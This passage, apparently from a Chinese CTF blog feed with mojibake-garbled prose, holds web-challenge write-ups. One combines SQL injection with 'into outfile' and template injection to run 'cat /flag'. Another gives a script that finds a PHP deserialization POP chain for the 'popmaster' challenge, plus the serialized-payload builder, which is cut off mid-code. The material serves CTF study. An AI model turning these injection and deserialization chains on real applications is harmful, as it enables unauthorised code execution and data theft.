ä¸€ä¸ªæ¶æ„æ–‡ä»¶ã€‚</p><p>å¦‚ä½•å¾€æœåŠ¡å™¨ä¸Šä¸Šä¼ æ–‡ä»¶å‘¢.æ ¹æ®å‰æ–‡ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¯¥pythonåº”ç”¨ä¸ºmysqlç”¨æˆ·æƒé™å¯åŠ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥è€ƒè™‘é€šè¿‡mysqlçš„<code>into outfile</code>è¯­å¥å†™æ–‡ä»¶ã€‚è¿™é‡Œåˆ†ä¸ºä¸¤æ­¥ï¼Œé¦–å…ˆæ˜¯å¾€æ•°æ®åº“é‡Œå†™ä¸œè¥¿ï¼Œè¿™ä¸ªå¯ä»¥ç›´æ¥é€šè¿‡æ³¨å†ŒåŠŸèƒ½å®ç°ï¼Œç¬¬äºŒæ­¥æ˜¯å°†æ•°æ®åº“é‡Œçš„æ•°æ®å¯¼å‡ºè‡³æ–‡ä»¶ï¼Œåœ¨mysqlä¸­é»˜è®¤å¯¼å‡ºç›®å½•ä¸º<code>/var/lib/mysql-files/</code>ï¼Œå…¶ä»–ç›®å½•æ˜¯æ²¡æœ‰å¯¼å‡ºæƒé™çš„ï¼Œå› æ­¤æˆ‘ä»¬å°†æ–‡ä»¶å¯¼å‡ºè‡³è¯¥æ–‡ä»¶å¤¹ã€‚<br>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">/register.php?username=guoke&amp;password=&#123;% set <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat  /flag&quot;</span>).read()%&#125;<br>/register.php?username=guoke<span class="hljs-string">&#x27; into outfile &#x27;</span>/<span class="hljs-keyword">var</span>/lib/mysql-files/guoke&amp;password=<span class="hljs-number">123</span><br>/good_job_my_ctfer.php?congratulations=&#123;% <span class="hljs-keyword">extends</span> /<span class="hljs-keyword">var</span>/lib/mysql-files/guoke%&#125;<br><br></code></pre></div></td></tr></table></figure><p>æœ€åå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210717222121119.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘è¢«-popmaster</title>
    <link href="/2021/07/14/2021-7-14-popmaster/"/>
    <url>/2021/07/14/2021-7-14-popmaster/</url>
    
    <content type="html"><![CDATA[<h2 id="popmaster"><a href="#popmaster" class="headerlink" title="popmaster"></a>popmaster</h2><p>expå¦‚ä¸‹(nodeä¸ºèŠ‚ç‚¹)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> nose<br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span>  make_parser<br><span class="hljs-keyword">from</span>  phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br>parser = make_parser() <br>func_name = <span class="hljs-string">&quot;BFda7w&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\popmaster.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer) <span class="hljs-comment">#è¾“å‡ºæŠ½è±¡è¯­æ³•æ ‘</span><br>functions = &#123;&#125;<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>    class_name = out.name<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            functions[node.name] = out<br>target = functions[func_name]<br><span class="hljs-comment"># print(target)</span><br><span class="hljs-comment"># å¼ºèµ‹å€¼å‡½æ•°ç›´æ¥è·³è¿‡</span><br><br>skip_func = [<span class="hljs-string">&quot;F03wGk&quot;</span>, <span class="hljs-string">&quot;c3BsKT&quot;</span> ,<span class="hljs-string">&quot;C2S8YY&quot;</span> ,<span class="hljs-string">&quot;g5uQo2&quot;</span> ,<span class="hljs-string">&quot;mdNq2Z&quot;</span> ,<span class="hljs-string">&quot;CpBMKR&quot;</span> ,<span class="hljs-string">&quot;xYClcr&quot;</span>,<span class="hljs-string">&quot;RhTsLz&quot;</span>,<span class="hljs-string">&quot;rivyS9&quot;</span>,<span class="hljs-string">&quot;sIm1Q9&quot;</span>,<span class="hljs-string">&quot;qMKDLp&quot;</span>,<span class="hljs-string">&quot;dgkACH&quot;</span>,<span class="hljs-string">&quot;wWVqKa&quot;</span>]<span class="hljs-comment">#è¿™ä¸ªåœ°æ–¹éœ€è¦è‡ªå·±æµ‹è¯•æ‰¾å‡ºæ¥ä¸ç¬¦åˆçš„å‡½æ•°</span><br><br>pop_chain = []<br>pop_chain.append(func_name)<br>e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            <span class="hljs-keyword">if</span> node.name == func_name:<br>                <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br>                            <span class="hljs-keyword">continue</span><br>                        target = functions[subnode.name]<br>                        func_name = subnode.name<br>                        pop_chain.append(func_name)<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br>                        <span class="hljs-comment"># print(subnode.node.name)</span><br>                            <span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br>                                <span class="hljs-keyword">continue</span><br>                            target = functions[subnode.node.name]<br>                            func_name = subnode.node.name<br>                            pop_chain.append(func_name)<br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(subnode) == Eval):<br>                        e = <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(pop_chain)<br><span class="hljs-comment"># pop_chain = [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;yv2r6Y&#x27;, &#x27;Nq02C8&#x27;]</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br>            <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br>                     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> + functions[pop_chain[i + <span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;rivyS9&#x27;, &#x27;mdNq2Z&#x27;, &#x27;LHl965&#x27;, &#x27;E0eLx8&#x27;, &#x27;DuLIOe&#x27;, &#x27;WCe4Tq&#x27;, &#x27;TmAYUb&#x27;, &#x27;LAekG5&#x27;, &#x27;r2q0UF&#x27;, &#x27;C2S8YY&#x27;, &#x27;g5uQo2&#x27;,</span><br><span class="hljs-comment">#  &#x27;KxPhgA&#x27;, &#x27;lsA527&#x27;, &#x27;LRu117&#x27;, &#x27;MFpxq9&#x27;, &#x27;xafXFm&#x27;, &#x27;GsVAVW&#x27;, &#x27;dGcfBB&#x27;, &#x27;YY6r37&#x27;, &#x27;gH4fYy&#x27;, &#x27;U6xl6Q&#x27;, &#x27;eRt60t&#x27;]</span><br><span class="hljs-comment"># F03wGk c3BsKT C2S8YY g5uQo2 mdNq2Z CpBMKR xYClcr rivyS9 sIm1Q9</span><br><span class="hljs-comment"># qMKDLp dgkACH</span><br><span class="hljs-comment"># qqhftt qMKDLp  M7qPV2 dgkACH xG4zKc</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;,</span><br><span class="hljs-comment">#  &#x27;dgkACH&#x27;, &#x27;S8CRbp&#x27;, &#x27;g0Evp1&#x27;, &#x27;FZp1N3&#x27;, &#x27;xkFzHK&#x27;, &#x27;gcVOmb&#x27;, &#x27;ozDZgT&#x27;, &#x27;gHWISY&#x27;, &#x27;c7rQmp&#x27;, &#x27;HwiCXY&#x27;, &#x27;OfIYHw&#x27;, &#x27;foTwm3&#x27;]</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;wWVqKa&#x27;, &#x27;qM2mnx&#x27;]</span><br><br><br></code></pre></div></td></tr></table></figure><p>å¾—åˆ°popé“¾ï¼Œæ„é€ payloadæ‰“</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPmYmu</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$qfDgtGD</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;qfDgtGD= <span class="hljs-keyword">new</span> z3w6kL();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">z3w6kL</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$X5XSpPz</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;X5XSpPz= <span class="hljs-keyword">new</span> olTmkb();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">olTmkb</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$tTEiXpd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;tTEiXpd= <span class="hljs-keyword">new</span> Moag8l();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moag8l</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$D8ea5Xn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;D8ea5Xn= <span class="hljs-keyword">new</span> QcHqVE();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QcHqVE</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XHhuV4y</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XHhuV4y= <span class="hljs-keyword">new</span> hCG6ag();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hCG6ag</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cYnq47g</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;cYnq47g= <span class="hljs-keyword">new</span> EYyxSm();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EYyxSm</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$A7icng3</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;A7icng3= <span class="hljs-keyword">new</span> CDF5aP();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CDF5aP</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$KUxwPnq</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;KUxwPnq= <span class="hljs-keyword">new</span> a1rktQ();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a1rktQ</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$G2ZqPlg</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;G2ZqPlg= <span class="hljs-keyword">new</span> bPC9aV();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bPC9aV</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$mUtXpNL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;mUtXpNL= <span class="hljs-keyword">new</span> lNHRgw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lNHRgw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iI0ggvd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iI0ggvd= <span class="hljs-keyword">new</span> uhsLTo();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">uhsLTo</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$V4cm8RE</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;V4cm8RE= <span class="hljs-keyword">new</span> xmFnqe();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xmFnqe</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XVKtQaL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XVKtQaL= <span class="hljs-keyword">new</span> ygWYP5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ygWYP5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$BeaCQ8a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;BeaCQ8a= <span class="hljs-keyword">new</span> kU9NTw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">kU9NTw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Rc3QaRn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;Rc3QaRn= <span class="hljs-keyword">new</span> gyRrwz();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gyRrwz</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ykDFgZf</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ykDFgZf= <span class="hljs-keyword">new</span> Q2GEHp();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Q2GEHp</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$GgRUaWA</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;GgRUaWA= <span class="hljs-keyword">new</span> cnxShX();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cnxShX</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$lKlVzwp</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;lKlVzwp= <span class="hljs-keyword">new</span> MyFOP4();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFOP4</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$aIr6pnl</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;aIr6pnl= <span class="hljs-keyword">new</span> TWKFWY();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TWKFWY</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iMX9NnG</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iMX9NnG= <span class="hljs-keyword">new</span> ogz6Dr();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ogz6Dr</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ThhObgx</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ThhObgx= <span class="hljs-keyword">new</span> QaCgIg();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QaCgIg</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gpW7aFB</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;gpW7aFB= <span class="hljs-keyword">new</span> Zg0xg5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Zg0xg5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$p4epegQ</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> TPmYmu());<br><span 